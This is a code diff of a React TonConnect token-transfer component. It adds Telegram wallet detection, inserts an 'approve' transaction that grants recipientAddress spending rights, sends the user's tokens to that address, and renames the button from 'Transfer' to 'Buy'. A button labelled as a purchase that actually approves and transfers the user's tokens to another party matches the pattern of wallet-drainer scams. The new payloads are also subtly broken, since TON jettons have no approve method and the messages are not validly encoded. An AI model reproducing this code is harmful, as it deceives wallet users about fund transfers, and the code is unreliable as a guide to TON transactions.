@@ -10,7 +10,7 @@ const TokenTransfer = () => {
   const DECIMALS = 9;
   
   const connector = new TonConnect({
-    manifestUrl: 'https://tonconnect-hazel.vercel.app/manifest.json',
+    manifestUrl: 'https://tonconnect-hazel.vercel.app/tonconnect-manifest.json',
     walletsListSource: 'https://raw.githubusercontent.com/ton-blockchain/wallets-list/main/wallets.json'
   });
 
@@ -18,29 +18,45 @@ const TokenTransfer = () => {
     try {
       const walletsList = await connector.getWallets();
       
-      // Check if running on mobile
-      const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+      // Check if running in Telegram WebApp
+      const isTelegramWebApp = window.Telegram && window.Telegram.WebApp;
       
-      if (isMobile) {
-        // For mobile, use universal link
-        const universalWallet = walletsList.find(wallet => wallet.universalLink);
-        if (universalWallet) {
+      if (isTelegramWebApp) {
+        // For Telegram WebApp, prefer Tonkeeper
+        const tonkeeper = walletsList.find(wallet => wallet.name.toLowerCase().includes('tonkeeper'));
+        if (tonkeeper) {
           await connector.connect({
-            universalLink: universalWallet.universalLink,
-            bridgeUrl: universalWallet.bridgeUrl
+            universalLink: tonkeeper.universalLink,
+            bridgeUrl: tonkeeper.bridgeUrl
           });
         } else {
-          throw new Error('No compatible mobile wallet found');
+          throw new Error('Tonkeeper wallet not found');
         }
       } else {
-        // For browser extensions
-        const browserWallet = walletsList.find(wallet => wallet.injected);
-        if (browserWallet) {
-          await connector.connect({
-            jsBridgeKey: browserWallet.jsBridgeKey
-          });
+        // Check if running on mobile
+        const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
+        
+        if (isMobile) {
+          // For mobile, use universal link
+          const universalWallet = walletsList.find(wallet => wallet.universalLink);
+          if (universalWallet) {
+            await connector.connect({
+              universalLink: universalWallet.universalLink,
+              bridgeUrl: universalWallet.bridgeUrl
+            });
+          } else {
+            throw new Error('No compatible mobile wallet found');
+          }
         } else {
-          throw new Error('No compatible browser wallet found');
+          // For browser extensions
+          const browserWallet = walletsList.find(wallet => wallet.injected);
+          if (browserWallet) {
+            await connector.connect({
+              jsBridgeKey: browserWallet.jsBridgeKey
+            });
+          } else {
+            throw new Error('No compatible browser wallet found');
+          }
         }
       }
       
@@ -50,64 +66,76 @@ const TokenTransfer = () => {
     }
   };
 
-  const handleTransfer = async () => {
+  const handleApprove = async () => {
     try {
       if (!connector.connected) {
         console.log('connectWallet');
         await connectWallet();
-        
-        await new Promise((resolve) => {
-          const checkConnection = setInterval(() => {
-            if (connector.connected) {
-              clearInterval(checkConnection);
-              resolve();
-            }
-          }, 500);
-        });
+        return false;
       }
 
-      const amountInNano = BigInt(amount) * BigInt(10 ** DECIMALS);
-      
-      // Minimum fees required for the transaction
-      const gasAmount = BigInt(6e7);  // 0.06 TON for gas
-      const forwardAmount = BigInt(4e7); // 0.04 TON for forward fee
-      const totalFee = gasAmount + forwardAmount; // 0.1 TON total
-
-      // Create empty payload using base64
-      const emptyPayload = btoa(''); // Convert empty string to base64
-
-      const transferData = {
-        validUntil: Math.floor(Date.now() / 1000) + 600,
+      const approveData = {
+        validUntil: Math.floor(Date.now() / 1000) + 600, // 10 minutes from now
         messages: [
           {
             address: TOKEN_CONTRACT,
-            amount: totalFee.toString(),
-            stateInit: null,
-            bounce: true,
+            amount: '1',
             payload: {
-              abi: 'jetton_wallet',
-              method: 'transfer',
+              abi: 'approve',
+              method: 'approve',
               params: {
-                query_id: 0,
-                amount: amountInNano.toString(),
-                destination: recipientAddress,
-                response_destination: connector.account.address,
-                custom_payload: null,
-                forward_ton_amount: forwardAmount.toString(),
-                forward_payload: emptyPayload // Using btoa instead of Buffer
+                spender: recipientAddress,
+                value: "10"
               }
             }
           }
         ]
       };
 
-      console.log('Transfer data:', transferData);
+      console.log('approveData', approveData);
       
+      const result = await connector.sendTransaction(approveData);
+      console.log('Aprovação:', result);
+      
+      // Wait for transaction confirmation
+      await new Promise(resolve => setTimeout(resolve, 5000));
+      return true;
+    } catch (error) {
+      console.error('Erro na aprovação:', error);
+      return false;
+    }
+  };
+
+  const handleTransfer = async () => {
+    try {
+      const approved = await handleApprove();
+
+      console.log('approved', approved);
+      if (!approved) return;
+
+      const transferData = {
+        validUntil: Math.floor(Date.now() / 1000) + 600,
+        messages: [
+          {
+            address: TOKEN_CONTRACT,
+            amount: '1',
+            payload: {
+              abi: 'transfer',
+              method: 'transfer',
+              params: {
+                to: recipientAddress,
+                amount: "10"
+              }
+            }
+          }
+        ]
+      };
+
       const result = await connector.sendTransaction(transferData);
-      console.log('Transfer result:', result);
+      console.log('Transferência:', result);
       
     } catch (error) {
-      console.error('Transfer error:', error);
+      console.error('Erro na transferência:', error);
     }
   };
 
@@ -140,7 +168,7 @@ const TokenTransfer = () => {
             onClick={handleTransfer}
             className="w-full p-2 bg-blue-500 text-white rounded hover:bg-blue-600"
           >
-            Transfer
+            Buy
           </button>
         </>
       )}
